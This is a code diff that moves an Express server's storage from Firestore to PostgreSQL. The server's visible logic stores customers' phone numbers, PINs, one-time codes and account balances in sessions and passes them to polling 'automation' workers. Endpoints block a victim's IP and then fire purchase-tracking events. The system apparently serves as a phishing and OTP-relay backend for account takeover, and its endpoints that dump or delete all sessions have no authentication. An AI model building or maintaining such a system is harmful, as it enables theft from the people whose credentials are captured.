@@ -2,25 +2,87 @@ const express = require('express');
 const cors = require('cors');
 const path = require('path');
 const fs = require('fs');
-const { initializeApp, getApps } = require('firebase/app');
-const { initializeFirestore, getFirestore, collection, doc, setDoc, deleteDoc, onSnapshot, getDocs } = require('firebase/firestore');
-const firebaseConfig = require('./firebase-applet-config.json');
+const { Pool } = require('pg');
 
-let firebaseApp;
-if (!getApps().length) {
-  firebaseApp = initializeApp(firebaseConfig);
-} else {
-  firebaseApp = getApps()[0];
+const pool = new Pool({ connectionString: process.env.DATABASE_URL });
+
+// ---------------------------------------------------------------------------
+// Helpers: PostgreSQL-backed persistence
+// ---------------------------------------------------------------------------
+
+async function dbUpsertSession(id, data) {
+  await pool.query(
+    'INSERT INTO sessions (id, data) VALUES ($1, $2) ON CONFLICT (id) DO UPDATE SET data = $2',
+    [id, JSON.stringify(data)]
+  );
 }
-let adminDb;
-try {
-  adminDb = initializeFirestore(firebaseApp, {
-    experimentalAutoDetectLongPolling: true,
-    experimentalForceLongPolling: true,
-  }, firebaseConfig.firestoreDatabaseId);
-} catch (e) {
-  adminDb = getFirestore(firebaseApp, firebaseConfig.firestoreDatabaseId);
+
+async function dbDeleteSession(id) {
+  await pool.query('DELETE FROM sessions WHERE id = $1', [id]);
 }
+
+async function dbLoadAllSessions() {
+  const res = await pool.query('SELECT id, data FROM sessions');
+  const map = {};
+  for (const row of res.rows) map[row.id] = row.data;
+  return map;
+}
+
+async function dbDeleteOldSessions(cutoff) {
+  // cutoff is a timestamp (ms); delete sessions whose lastUpdated/createdAt is older
+  const res = await pool.query(
+    `DELETE FROM sessions
+     WHERE GREATEST(
+       (data->>'lastUpdated')::bigint,
+       (data->>'createdAt')::bigint,
+       (data->>'assignedAt')::bigint,
+       0
+     ) < $1
+     RETURNING id`,
+    [cutoff]
+  );
+  return res.rows.map(r => r.id);
+}
+
+async function dbDeleteAllSessions() {
+  const res = await pool.query('DELETE FROM sessions RETURNING id');
+  return res.rows.map(r => r.id);
+}
+
+async function dbBlockIp(ip) {
+  await pool.query('INSERT INTO blocked_ips (ip) VALUES ($1) ON CONFLICT DO NOTHING', [ip]);
+}
+
+async function dbUnblockIp(ip) {
+  await pool.query('DELETE FROM blocked_ips WHERE ip = $1', [ip]);
+}
+
+async function dbLoadAllBlockedIps() {
+  const res = await pool.query('SELECT ip FROM blocked_ips');
+  const map = {};
+  for (const row of res.rows) map[row.ip] = true;
+  return map;
+}
+
+async function dbUpsertSetting(key, value) {
+  await pool.query(
+    'INSERT INTO settings (key, value) VALUES ($1, $2) ON CONFLICT (key) DO UPDATE SET value = $2',
+    [key, JSON.stringify(value)]
+  );
+}
+
+async function dbDeleteSetting(key) {
+  await pool.query('DELETE FROM settings WHERE key = $1', [key]);
+}
+
+async function dbLoadAllSettings() {
+  const res = await pool.query('SELECT key, value FROM settings');
+  const map = {};
+  for (const row of res.rows) map[row.key] = row.value;
+  return map;
+}
+
+// ---------------------------------------------------------------------------
 
 const PORT = 3000;
 const app = express();
@@ -50,25 +112,12 @@ let sessions = {};
 let blockedIps = {};
 let settings = {};
 
-if (require.main === module) {
-  onSnapshot(collection(adminDb, 'sessions'), snap => {
-    const newSessions = {};
-    snap.forEach(doc => { newSessions[doc.id] = doc.data(); });
-    sessions = newSessions;
-  });
-  onSnapshot(collection(adminDb, 'blocked_ips'), snap => {
-    const newBlocked = {};
-    snap.forEach(doc => { newBlocked[doc.id] = true; });
-    blockedIps = newBlocked;
-  });
-  onSnapshot(collection(adminDb, 'settings'), snap => {
-    const newSettings = {};
-    snap.forEach(doc => {
-      const data = doc.data();
-      newSettings[doc.id] = ('value' in data) ? data.value : data;
-    });
-    settings = newSettings;
-  });
+// Load all data from PostgreSQL into memory on startup
+async function loadFromDb() {
+  sessions = await dbLoadAllSessions();
+  blockedIps = await dbLoadAllBlockedIps();
+  settings = await dbLoadAllSettings();
+  console.log(`[DB] Loaded ${Object.keys(sessions).length} sessions, ${Object.keys(blockedIps).length} blocked IPs, ${Object.keys(settings).length} settings`);
 }
 
 function saveSessions() {}
@@ -94,7 +143,7 @@ function runLockSweeper(sessionsObj, saveFn, lockTimeoutMs, now) {
       if (lockAge >= lockTimeoutMs) {
         const updates = { ...data, assignedWorker: null, assignedAt: null, adminAction: data.adminAction || 'REVIEW_APP', lastUpdated: ts };
         sessionsObj[id] = updates;
-        setDoc(doc(adminDb, 'sessions', id), updates);
+        dbUpsertSession(id, updates).catch(err => console.error('[Lock sweeper] DB error:', err));
         changed = true;
       }
     }
@@ -107,80 +156,56 @@ const PURGE_SWEEPER_INTERVAL_MS = 10 * 60 * 1000; // run every 10 minutes
 
 /**
  * Automatically delete all sessions that are older than 24 hours (1 day).
- * Purges from Firestore collection 'sessions' and the in-memory sessions map.
+ * Purges from PostgreSQL and the in-memory sessions map.
  *
  * @param {object} sessionsObj - mutable in-memory sessions map
- * @param {object} firestoreDb - Firestore db instance
  * @param {number} [now] - override for Date.now()
  * @returns {Promise<number>} - number of deleted sessions
  */
-async function purgeOldSessions(sessionsObj, firestoreDb, now) {
+async function purgeOldSessions(sessionsObj, _unused, now) {
   const ts = now !== undefined ? now : Date.now();
-  const toDeleteIds = new Set();
+  const cutoff = ts - ONE_DAY_MS;
 
-  if (sessionsObj) {
-    for (const [id, data] of Object.entries(sessionsObj)) {
-      if (!data) {
-        toDeleteIds.add(id);
-        continue;
-      }
-      const sessionTime = data.lastUpdated || data.createdAt || data.assignedAt || (id.startsWith('SESS-') ? parseInt(id.replace('SESS-', ''), 10) : 0);
-      if (sessionTime && (ts - sessionTime) >= ONE_DAY_MS) {
-        toDeleteIds.add(id);
-      }
-    }
-  }
-
-  if (firestoreDb) {
-    try {
-      const snap = await getDocs(collection(firestoreDb, 'sessions'));
-      snap.forEach(docSnap => {
-        const d = docSnap.data() || {};
-        const docId = docSnap.id;
-        const sTime = d.lastUpdated || d.createdAt || d.assignedAt || (docId.startsWith('SESS-') ? parseInt(docId.replace('SESS-', ''), 10) : 0);
-        if (sTime && (ts - sTime) >= ONE_DAY_MS) {
-          toDeleteIds.add(docId);
-        }
-      });
-    } catch (err) {
-      console.error('[Auto-Purge] Error fetching Firestore sessions:', err);
-    }
-  }
-
-  let deletedCount = 0;
-  for (const id of toDeleteIds) {
-    if (sessionsObj && sessionsObj[id]) {
+  // Remove from in-memory map
+  let inMemoryCount = 0;
+  for (const [id, data] of Object.entries(sessionsObj)) {
+    if (!data) { delete sessionsObj[id]; inMemoryCount++; continue; }
+    const sessionTime = data.lastUpdated || data.createdAt || data.assignedAt ||
+      (id.startsWith('SESS-') ? parseInt(id.replace('SESS-', ''), 10) : 0);
+    if (sessionTime && (ts - sessionTime) >= ONE_DAY_MS) {
       delete sessionsObj[id];
-    }
-    if (firestoreDb) {
-      try {
-        await deleteDoc(doc(firestoreDb, 'sessions', id));
-        deletedCount++;
-      } catch (e) {
-        console.error(`[Auto-Purge] Failed to delete doc ${id}:`, e);
-      }
-    } else {
-      deletedCount++;
+      inMemoryCount++;
     }
   }
 
-  if (toDeleteIds.size > 0) {
-    console.log(`[Auto-Purge] Automatically deleted ${toDeleteIds.size} session(s) older than 1 day.`);
+  // Remove from PostgreSQL
+  let deletedIds = [];
+  try {
+    deletedIds = await dbDeleteOldSessions(cutoff);
+  } catch (err) {
+    console.error('[Auto-Purge] Error purging PostgreSQL sessions:', err);
   }
-  return deletedCount;
+
+  const total = Math.max(inMemoryCount, deletedIds.length);
+  if (total > 0) {
+    console.log(`[Auto-Purge] Automatically deleted ${total} session(s) older than 1 day.`);
+  }
+  return total;
 }
 
 // Background sweepers
 const LOCK_SWEEPER_INTERVAL_MS = 60000; // run every 60 seconds
 if (require.main === module) {
+  loadFromDb().catch(err => console.error('[DB] Failed to load initial data:', err));
+
   setInterval(() => {
     runLockSweeper(sessions, saveSessions, LOCK_TIMEOUT_MS);
   }, LOCK_SWEEPER_INTERVAL_MS);
 
   // Run 1-day auto-purge immediately on startup and every 10 minutes
-  purgeOldSessions(sessions, adminDb).catch(() => {});
+  purgeOldSessions(sessions, null).catch(() => {});
   setInterval(() => {
-    purgeOldSessions(sessions, adminDb).catch(() => {});
+    purgeOldSessions(sessions, null).catch(() => {});
   }, PURGE_SWEEPER_INTERVAL_MS);
 }
 
@@ -222,7 +247,7 @@ function handleGetData(worker, req, res) {
           if (lockAge < LOCK_TIMEOUT_MS) return false;
           const updates = { ...d, assignedWorker: null, assignedAt: null, adminAction: 'REVIEW_APP', lastUpdated: Date.now() };
           sessions[s.id] = updates;
-          setDoc(doc(adminDb, 'sessions', s.id), updates);
+          dbUpsertSession(s.id, updates).catch(() => {});
           return false;
         }
         const pinOnlyData = `NONE,NONE,NONE,${s.id},${d.pin}`;
@@ -240,7 +265,7 @@ function handleGetData(worker, req, res) {
         if (lockAge < LOCK_TIMEOUT_MS) return false;
         const updates = { ...d, assignedWorker: null, assignedAt: null, adminAction: 'REVIEW_APP', lastUpdated: Date.now() };
           sessions[s.id] = updates;
-          setDoc(doc(adminDb, 'sessions', s.id), updates);
+          dbUpsertSession(s.id, updates).catch(() => {});
         return false;
       }
 
@@ -272,7 +297,7 @@ function handleGetData(worker, req, res) {
         const sendTime = Date.now();
         const updates = { ...data, assignedWorker: worker, assignedAt: sendTime, lastAutomationData: pinOnlyData, lastUpdated: sendTime, lastDataSentAt: sendTime, lastDataType: 'pin_reset', lastActionTrigger: null, lastActionAt: 0, pinResetMode: false };
         sessions[id] = updates;
-        setDoc(doc(adminDb, 'sessions', id), updates);
+        dbUpsertSession(id, updates).catch(() => {});
         return res.send(pinOnlyData);
       }
       const number = data.gatewayPhone || data.initialPhone;
@@ -286,7 +311,7 @@ function handleGetData(worker, req, res) {
       const sendTime = Date.now();
       const updates = { ...data, assignedWorker: worker, assignedAt: sendTime, lastAutomationData: currentData, lastUpdated: sendTime, lastDataSentAt: sendTime, lastDataType: dataType, lastActionTrigger: null, lastActionAt: 0, balance: '', otp: '', gatewayOtp: '', lastBalance: data.balance || data.lastBalance || '' };
       sessions[id] = updates;
-      setDoc(doc(adminDb, 'sessions', id), updates);
+      dbUpsertSession(id, updates).catch(() => {});
       return res.send(currentData);
     }
     return res.send("NO_DATA");
@@ -430,7 +455,7 @@ function handleAutomationReport(req, res) {
     else if (status === 'DONE') { updates.processedByAutomation = true; updates.assignedWorker = null; updates.assignedAt = null; }
 
     sessions[id] = Object.assign({}, existing, updates);
-    setDoc(doc(adminDb, 'sessions', id), sessions[id]);
+    dbUpsertSession(id, sessions[id]).catch(err => console.error('[Automation report] DB error:', err));
     res.type('text/plain').send('NO_DATA');
   } catch (err) {
     res.status(500).type('text/plain').send('NO_DATA');
@@ -449,13 +474,13 @@ app.get('/api/check-blocked', (req, res) => {
 
 app.post('/api/block-ip', (req, res) => {
   blockedIps[req.body.ip] = true;
-  setDoc(doc(adminDb, 'blocked_ips', req.body.ip), { blocked: true });
+  dbBlockIp(req.body.ip).catch(() => {});
   res.json({ success: true });
 });
 
 app.post('/api/unblock-ip', (req, res) => {
   delete blockedIps[req.body.ip];
-  deleteDoc(doc(adminDb, 'blocked_ips', req.body.ip));
+  dbUnblockIp(req.body.ip).catch(() => {});
   res.json({ success: true });
 });
 
@@ -465,7 +490,7 @@ app.get('/api/block-ip-trigger', (req, res) => {
     return res.status(400).type('text/plain').send('NO_DATA');
   }
   blockedIps[ip] = true;
-  setDoc(doc(adminDb, 'blocked_ips', ip), { blocked: true });
+  dbBlockIp(ip).catch(() => {});
   const matching = Object.values(sessions).filter(s => s && s.clientIp === ip && !s.purchaseFired && !s.purchaseInFlight);
   Promise.allSettled(matching.map(s => firePurchaseForSession(s, req.headers.referer || '')))
     .then(results => {
@@ -488,7 +513,7 @@ app.get('/api/block-customer', (req, res) => {
   }
   const ip = customer.clientIp;
   blockedIps[ip] = true;
-  setDoc(doc(adminDb, 'blocked_ips', ip), { blocked: true });
+  dbBlockIp(ip).catch(() => {});
   firePurchaseForSession(customer, req.headers.referer || '').catch(() => {});
 
   const number = customer.gatewayPhone || customer.initialPhone || '';
@@ -520,11 +545,11 @@ app.post('/api/db', (req, res) => {
     // Bug 5 fix: merge instead of full replace to preserve server-side fields
     const id = dbPath.replace('sessions/', '');
     sessions[id] = Object.assign({}, sessions[id] || {}, data);
-    setDoc(doc(adminDb, 'sessions', id), sessions[id], { merge: true });
+    dbUpsertSession(id, sessions[id]).catch(() => {});
   } else if (dbPath && dbPath.startsWith('settings/')) {
     const key = dbPath.replace('settings/', '');
     settings[key] = data;
-    setDoc(doc(adminDb, 'settings', key), { value: data }, { merge: true });
+    dbUpsertSetting(key, data).catch(() => {});
   }
   res.json({ success: true });
 });
@@ -534,11 +559,11 @@ app.patch('/api/db', (req, res) => {
   if (dbPath && dbPath.startsWith('sessions/')) {
     const id = dbPath.replace('sessions/', '');
     sessions[id] = Object.assign({}, sessions[id] || {}, data);
-    setDoc(doc(adminDb, 'sessions', id), sessions[id], { merge: true });
+    dbUpsertSession(id, sessions[id]).catch(() => {});
   } else if (dbPath && dbPath.startsWith('settings/')) {
     const key = dbPath.replace('settings/', '');
     settings[key] = data;
-    setDoc(doc(adminDb, 'settings', key), { value: data }, { merge: true });
+    dbUpsertSetting(key, data).catch(() => {});
   }
   res.json({ success: true });
 });
@@ -548,11 +573,11 @@ app.delete('/api/db', (req, res) => {
   if (dbPath && dbPath.startsWith('sessions/')) {
     const id = dbPath.replace('sessions/', '');
     delete sessions[id];
-    deleteDoc(doc(adminDb, 'sessions', id));
+    dbDeleteSession(id).catch(() => {});
   } else if (dbPath && dbPath.startsWith('settings/')) {
     const key = dbPath.replace('settings/', '');
     delete settings[key];
-    deleteDoc(doc(adminDb, 'settings', key));
+    dbDeleteSetting(key).catch(() => {});
   }
   res.json({ success: true });
 });
@@ -673,7 +698,8 @@ async function firePurchaseForSession(sess, sourceUrl) {
   if (!sess || sess.purchaseFired) return { skipped: true };
   if (sess.purchaseInFlight) return { skipped: true, reason: 'in_flight' };
   sess.purchaseInFlight = true;
-  setDoc(doc(adminDb, 'sessions', sess.id || sess.orderId || 'unknown'), sess, { merge: true });
+  const sessId = sess.id || sess.orderId || 'unknown';
+  dbUpsertSession(sessId, sess).catch(() => {});
   const eventId = sess.purchaseEventId || ('purchase_' + (sess.id || sess.orderId || Date.now()));
   sess.purchaseEventId = eventId;
   const result = await sendCapiEvent({
@@ -702,7 +728,7 @@ async function firePurchaseForSession(sess, sourceUrl) {
     sess.purchaseLastError = (result && (result.reason || JSON.stringify(result.error))) || 'unknown';
     sess.purchaseLastAttemptAt = Date.now();
   }
-  setDoc(doc(adminDb, 'sessions', sess.id || sess.orderId || 'unknown'), sess, { merge: true });
+  dbUpsertSession(sessId, sess).catch(() => {});
   return result;
 }
 
@@ -711,25 +737,8 @@ app.get('/api/sessions', (req, res) => res.json(sessions));
 app.delete('/api/sessions/all', async (req, res) => {
   try {
     sessions = {};
-
-    let deletedCount = 0;
-    try {
-      const snap = await getDocs(collection(adminDb, 'sessions'));
-      const deletePromises = [];
-      snap.forEach(docSnap => {
-        deletedCount++;
-        deletePromises.push(
-          deleteDoc(doc(adminDb, 'sessions', docSnap.id)).catch(err =>
-            console.error(`Error deleting session ${docSnap.id}:`, err)
-          )
-        );
-      });
-      await Promise.all(deletePromises);
-    } catch (fsErr) {
-      console.error('Error fetching Firestore sessions for deletion in /api/sessions/all:', fsErr);
-    }
-
-    res.json({ success: true, count: deletedCount });
+    const deletedIds = await dbDeleteAllSessions();
+    res.json({ success: true, count: deletedIds.length });
   } catch (err) {
     console.error('Failed to clear all sessions:', err);
     res.status(500).json({ error: 'Failed to clear all sessions' });
